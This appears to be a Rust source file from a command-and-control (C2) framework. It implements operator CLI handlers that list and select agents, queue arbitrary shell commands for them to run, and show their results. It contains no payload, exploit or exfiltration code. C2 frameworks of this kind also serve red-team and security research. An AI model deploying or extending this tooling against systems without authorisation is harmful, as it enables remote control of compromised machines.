use std::sync::Arc;
use tokio::sync::Mutex;


use crate::core::agent::AgentResult;
use crate::core::cli::cli::C2Cli;
use crate::core::c2::C2;
use crate::tasking::agent_command::AgentCommand;
use crate::tasking::tasking::Task;


pub async fn handle_list_command(c2: &Arc<Mutex<C2>>) {
    let c2 = c2.lock().await;
    c2.list_agents_pretty().await;
    // TODO: fix formatting to be in column format

}

pub async fn handle_help_command() {
    println!("Available: list, exit, show, remove, use, home, send");
}

pub async fn handle_show_command(c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    match parts.next() {
        Some(id_str) => match id_str.parse::<u64>() {
            Ok(id) => {
                let c2 = c2.lock().await;
                if c2.agent_exists(id).await {
                    c2.list_agent(id).await;
                } else {
                    println!("Invalid agent ID: {}", id);
                }
            }
            Err(_) => println!("Invalid agent ID: {}", id_str),
        },
        None => println!("Usage: show <agent_id>"),
    }
}

pub async fn handle_remove_command(cli: &C2Cli, c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    match parts.next() {
        Some(id_str) => match id_str.parse::<u64>() {
            Ok(id) => {
                if cli.current_agent != id {
                    let mut c2 = c2.lock().await;
                    if c2.agent_exists(id).await {
                        c2.remove_agent(id).await;
                    } else {println!("Invalid agent ID: {}", id);}
                } else {println!("You cannot remove the currently selected agent.");}
            }
            Err(_) => println!("Invalid agent ID: {}", id_str)
        }
        None => println!("Usage: remove <agent_id>")
    }
}

pub async fn handle_home_command(cli: &mut C2Cli) {
    cli.current_agent = 0;
}

pub async fn handle_use_command(cli: &mut C2Cli, c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    match parts.next() {
        Some(id_str) => match id_str.parse::<u64>() {
            Ok(id) => {
                let c2 = c2.lock().await;
                if c2.agent_exists(id).await {
                    cli.current_agent = id;
                } else {println!("Invalid agent ID: {}", id);}
            }
            Err(_) => println!("Invalid agent ID: {}", id_str),
        },
        None => println!("Usage: use <agent_id>"),
    }
}

pub async fn handle_send_command(cli: &C2Cli, c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    if cli.current_agent == 0 {
        println!("Select an Agent to use");
        return;
    }
    match parts.next().as_deref() {
        Some("command") => {
            let args: Vec<String> = parts.collect();
            if args.is_empty() {
                println!("Usage: send command <shell command>");
                return;
            }
            let task = args.join(" ");
            dbg!(&task);
            let c2 = c2.lock().await;
            c2.create_task(cli.current_agent, 
                Task {
                    command: AgentCommand::RunShell(task.clone()),
                    dispatched: false
                }
            ).await;

            let output = AgentResult::CommandOutput { 
                command: task, 
                output: None, 
                read: false,
                timestamp: None
            };
            c2.create_result(cli.current_agent, output).await;
            
        }

        Some(other) => {
            println!("Unknown send subcommand: '{}'", other);
        }
        None => {
            println!("Usage: send command <command>");
        }
    }
}

pub async fn handle_result_command(cli: &C2Cli, c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    // If using an agent, show that agent's results
    // result all -> shows read and unread
    // result clear -> clears results in Vec
    // By default, only shows unread
    if cli.current_agent == 0 {
        println!("Select an Agent to use");
        return;
    }
    match parts.next() {
        Some(option) => {
            match option.as_str() {
                "all" => {
                    let c2 = c2.lock().await;
                    c2.display_results(cli.current_agent, true).await;
                }
                "clear" => {
                    let c2 = c2.lock().await;
                    c2.clear_results(cli.current_agent).await;
                }
                _ => {
                    println!("Invalid option: Choose between 'all', 'clear', or leave blank")
                }
            }
        }
        None => {
            let c2 = c2.lock().await;
            c2.display_results(cli.current_agent, false).await;
        }
    }
} 
